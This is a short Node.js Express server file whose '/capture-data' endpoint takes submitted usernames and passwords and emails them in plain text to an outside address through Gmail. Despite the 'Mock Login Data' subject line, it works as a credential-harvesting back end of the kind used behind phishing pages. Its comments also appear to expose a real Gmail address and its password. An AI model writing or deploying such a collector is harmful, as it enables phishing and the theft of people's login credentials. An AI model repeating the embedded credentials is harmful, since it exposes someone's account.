const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());

app.post('/capture-data', (req, res) => {
    const { username, password } = req.body;

    // Send email using nodemailer
    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'YOUR_GMAIL_ADDRESS', // appsjoel08@gmail.com
            pass: 'YOUR_GMAIL_PASSWORD' // Ofjet52LU!42
        }
    });

    let mailOptions = {
        from: 'YOUR_GMAIL_ADDRESS',
        to: 'joel@joelapps.com',
        subject: 'Mock Login Data',
        text: `Username: ${username}, Password: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.status(500).send("Failed to send email");
        } else {
            console.log('Email sent: ' + info.response);
            res.status(200).send("Data captured");
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server started on http://localhost:${PORT}`);
});
